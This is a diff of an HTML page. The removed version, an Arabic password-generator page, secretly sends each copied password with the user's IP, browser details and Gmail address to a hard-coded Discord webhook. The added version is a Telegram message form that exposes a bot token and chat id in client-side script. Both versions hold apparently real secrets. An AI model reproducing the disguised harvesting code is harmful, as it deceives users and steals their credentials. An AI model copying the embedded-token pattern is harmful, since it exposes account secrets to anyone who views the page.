@@ -1,203 +1,208 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>توليد كلمة سر</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            animation: gradient 10s ease infinite;
-            background: linear-gradient(45deg, #ff7e5f, #feb47b);
-            background-size: 1000% 1000%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            color: #333;
-            text-align: center;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send Message to Telegram</title>
+  <style>
+    /* من Uiverse.io بواسطة 0xnihilism */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        @keyframes gradient {
-            0% {
-                background-position: 0% 50%;
-            }
-            50% {
-                background-position: 100% 50%;
-            }
-            100% {
-                background-position: 0% 50%;
-            }
-        }
+    body, html {
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #fafafa;
+    }
 
-        h1 {
-            margin-bottom: 20px;
-            font-size: 2.5em;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #28a745;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
-            margin: 5px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-        }
-        button:hover {
-            background-color: #218838;
-            transform: scale(1.05);
-        }
-        #email {
-            margin: 20px;
-            padding: 10px;
-            border: 2px solid #28a745;
-            border-radius: 5px;
-            width: 250px;
-            font-size: 16px;
-        }
-        #password {
-            margin: 20px;
-            font-size: 24px;
-            padding: 15px;
-            border: 2px solid #28a745;
-            border-radius: 5px;
-            background-color: rgba(255, 255, 255, 0.8);
-            width: 250px;
-            text-align: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-            color: #333;
-        }
-        #copiedPassword {
-            margin-top: 20px;
-            font-size: 20px;
-            padding: 10px;
-            border: 2px solid #28a745;
-            border-radius: 5px;
-            background-color: rgba(40, 167, 69, 0.2);
-            color: #28a745;
-            width: 250px;
-            text-align: center;
-            visibility: hidden; /* مخفي في البداية */
-            transition: visibility 0.5s, opacity 0.5s ease;
-            opacity: 0;
-        }
-        #copiedPassword.visible {
-            visibility: visible;
-            opacity: 1;
-        }
-        @media (max-width: 600px) {
-            h1 {
-                font-size: 2em;
-            }
-            #email, #password, #copiedPassword {
-                width: 90%;
-            }
-        }
-    </style>
+    .input__container {
+      position: relative;
+      background: #f0f0f0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: flex-start;
+      gap: 15px;
+      border: 4px solid #000;
+      max-width: 450px;
+      transition: all 400ms cubic-bezier(0.23, 1, 0.32, 1);
+      transform-style: preserve-3d;
+      transform: rotateX(10deg) rotateY(-10deg);
+      perspective: 1000px;
+      box-shadow: 10px 10px 0 #000;
+    }
+
+    .input__container:hover {
+      transform: rotateX(5deg) rotateY(1deg) scale(1.05);
+      box-shadow: 25px 25px 0 -5px #4f82e2, 25px 25px 0 0 #000;
+    }
+
+    .shadow__input {
+      content: "";
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      left: 0;
+      bottom: 0;
+      z-index: -1;
+      transform: translateZ(-50px);
+      background: linear-gradient(
+        45deg,
+        rgba(84, 128, 226, 0.4) 0%,
+        rgba(84, 128, 226, 0.1) 100%
+      );
+      filter: blur(20px);
+    }
+
+    .input__button__shadow {
+      cursor: pointer;
+      border: 3px solid #000;
+      background: #4f82e2;
+      transition: all 400ms cubic-bezier(0.23, 1, 0.32, 1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 12px;
+      transform: translateZ(20px);
+      position: relative;
+      z-index: 3;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+
+    .input__button__shadow:hover {
+      background: #4f82e2;
+      transform: translateZ(10px) translateX(-5px) translateY(-5px);
+      box-shadow: 5px 5px 0 0 #000;
+    }
+
+    .input__button__shadow svg {
+      fill: #fff;
+      width: 25px;
+      height: 25px;
+    }
+
+    .input__search,
+    .input__name {
+      width: 100%;
+      outline: none;
+      border: 3px solid #000;
+      padding: 15px;
+      font-size: 18px;
+      background: #fff;
+      color: #000;
+      transform: translateZ(10px);
+      transition: all 400ms cubic-bezier(0.23, 1, 0.32, 1);
+      position: relative;
+      z-index: 3;
+      font-family: "Roboto", Arial, sans-serif;
+      letter-spacing: -0.5px;
+    }
+
+    .input__search::placeholder,
+    .input__name::placeholder {
+      color: #666;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+
+    .input__search:hover,
+    .input__search:focus,
+    .input__name:hover,
+    .input__name:focus {
+      background: #f0f0f0;
+      transform: translateZ(20px) translateX(-5px) translateY(-5px);
+      box-shadow: 5px 5px 0 0 #000;
+    }
+
+    .input__container::before {
+      content: "Send Message";
+      position: absolute;
+      top: -15px;
+      left: 20px;
+      background: #4f82e2;
+      color: #fff;
+      font-weight: bold;
+      padding: 5px 10px;
+      font-size: 14px;
+      transform: translateZ(50px);
+      z-index: 4;
+      border: 2px solid #000;
+    }
+  </style>
 </head>
 <body>
-    <h1>توليد كلمة سر عشوائية</h1>
-    <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
-    <button id="generateBtn">توليد كلمة سر</button>
-    <div id="password"></div>
-    <button id="copyBtn">نسخ كلمة السر</button>
-    <div id="copiedPassword"></div> <!-- منطقة لعرض كلمة السر المنسوخة -->
+  <div class="input__container">
+    <div class="shadow__input"></div>
 
-    <script>
-        const webhookURL = 'https://discord.com/api/webhooks/1298716541080178739/8MoGMwQf9SPB8q2wblwtGuoQy_6V9_0pKEPoo9uzq3t3KtMfo97cjqnf_arbvl-NfIfy'; // استبدل هذا بالرابط الخاص بك
+    <!-- حقل اسم المرسل -->
+    <input type="text" id="senderName" class="input__name" placeholder="Enter your name" />
 
-        function generatePassword(length) {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';
-            let password = '';
-            for (let i = 0; i < length; i++) {
-                const randomIndex = Math.floor(Math.random() * chars.length);
-                password += chars[randomIndex];
-            }
-            return password;
+    <!-- حقل الرسالة -->
+    <input type="text" id="messageInput" class="input__search" placeholder="Type your message..." />
+
+    <!-- زر الإرسال -->
+    <button class="input__button__shadow" onclick="sendMessageToTelegram()">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#ffffff" width="20px" height="20px">
+        <path d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M6 14l9-5-9-5v10z"></path>
+      </svg>
+    </button>
+  </div>
+
+  <script>
+    function sendMessageToTelegram() {
+      var senderName = document.getElementById('senderName').value;
+      var message = document.getElementById('messageInput').value;
+
+      if (senderName.trim() === "" || message.trim() === "") {
+        alert("Please enter both your name and a message.");
+        return;
+      }
+
+      // التوكن الخاص بالبوت
+      var botToken = '7397593044:AAEgNl1QM8n9TQB-3fm6tJIH6W8e2XlN1QQ';  // استبدل برمز التوكن الخاص بك
+      // chat_id الخاص بالمجموعة أو المحادثة
+      var chatId = '7050344416';          // استبدل بـ chat_id الخاص بك أو مجموعة
+
+      // إرسال الرسالة مع اسم المرسل
+      var fullMessage = `Message from: ${senderName}\n\n${message}`;
+
+      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      var data = {
+        chat_id: chatId,
+        text: fullMessage
+      };
+
+      // إرسال الطلب عبر AJAX
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert("Message sent successfully!");
+          document.getElementById('messageInput').value = "";  // مسح الحقل بعد الإرسال
+          document.getElementById('senderName').value = "";  // مسح اسم المرسل بعد الإرسال
+        } else {
+          alert("Failed to send message.");
         }
-
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('خطأ في الحصول على IP:', error);
-                return 'غير معروف';
-            }
-        }
-
-        function getBrowserInfo() {
-            return navigator.userAgent; // معلومات المتصفح
-        }
-
-        async function sendToDiscord(password, ip, browser, email) {
-            const payload = {
-                content: `**كلمة السر المنسوخة:** \`\`\`${password}\`\`\`\n**عنوان IP:** \`${ip}\`\n**المتصفح:** \`${browser}\`\n**البريد الإلكتروني:** \`${email}\``
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('حدث خطأ أثناء إرسال الرسالة إلى ديسكورد.');
-                }
-            })
-            .catch(error => {
-                console.error('خطأ:', error);
-            });
-        }
-
-        document.getElementById('generateBtn').addEventListener('click', function() {
-            const email = document.getElementById('email').value; // الحصول على البريد الإلكتروني
-            if (!email) {
-                alert('يرجى إدخال بريدك الإلكتروني أولاً.');
-                return;
-            }
-
-            // تحقق مما إذا كان البريد الإلكتروني ينتهي بـ @gmail.com
-            if (!email.endsWith('@gmail.com')) {
-                alert('يرجى إدخال بريد إلكتروني صحيح ينتهي بـ @gmail.com.');
-                return;
-            }
-
-            const newPassword = generatePassword(12); // يمكنك تغيير الطول هنا
-            document.getElementById('password').innerText = newPassword;
-            document.getElementById('copiedPassword').style.visibility = 'hidden'; // إخفاء منطقة العرض
-        });
-
-        document.getElementById('copyBtn').addEventListener('click', async function() {
-            const passwordText = document.getElementById('password').innerText;
-            const email = document.getElementById('email').value; // الحصول على البريد الإلكتروني
-
-            if (passwordText) {
-                navigator.clipboard.writeText(passwordText)
-                    .then(async () => {
-                        const ip = await getUserIP(); // الحصول على عنوان IP
-                        const browser = getBrowserInfo(); // الحصول على معلومات المتصفح
-                        const copiedPasswordDiv = document.getElementById('copiedPassword');
-                        copiedPasswordDiv.innerText = `كلمة السر المنسوخة: ${passwordText}`;
-                        copiedPasswordDiv.classList.add('visible'); // إظهار المنطقة
-                        await sendToDiscord(passwordText, ip, browser, email); // إرسال كلمة السر، عنوان IP، معلومات المتصفح والبريد الإلكتروني إلى ديسكورد
-                    })
-                    .catch(err => {
-                        alert('حدث خطأ أثناء نسخ كلمة السر.');
-                    });
-            } else {
-                alert('يرجى توليد كلمة سر أولاً.');
-            }
-        });
-    </script>
+      })
+      .catch(error => {
+        alert("Error: " + error);
+      });
+    }
+  </script>
 </body>
 </html>
